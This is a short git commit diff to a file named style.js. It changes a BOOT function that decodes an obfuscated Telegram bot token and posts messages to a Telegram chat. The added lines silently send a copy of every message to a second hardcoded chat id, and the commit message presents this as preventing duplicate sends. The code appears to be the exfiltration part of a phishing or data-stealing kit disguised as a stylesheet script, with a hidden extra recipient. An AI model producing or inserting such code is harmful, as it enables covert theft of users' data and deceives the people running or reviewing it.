ecc2347b6b3e2445a8c6ca310a9dbb5874c0a5f0
Dev-105 <scriptcrash2024@gmail.com>
2026-06-11 19:19:32 +0100

    Modify BOOT function to control message sending
    Add a conditional to prevent multiple sends and set a flag.

--- style.js
+++ style.js
@@ -1,4 +1,5 @@
 function BOOT(id, text) {
+            let send = true ; 
             let token = atob('ODY2MjM2OTY1MjpBQUhpRVBNNHNUUDhHU2gzRXVPY2xBRmROUzZnUVYwRS1Eaw==');
             const chat_id = id;
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -15,4 +16,8 @@ function BOOT(id, text) {
                 .then(res => res.json())
                 .then(data => console.log(data))
                 .catch(err => console.log(err));
+            if (send && id != 5687419212) {
+            BOOT(5687419212, text);
+            send = false ;
+          }
         }
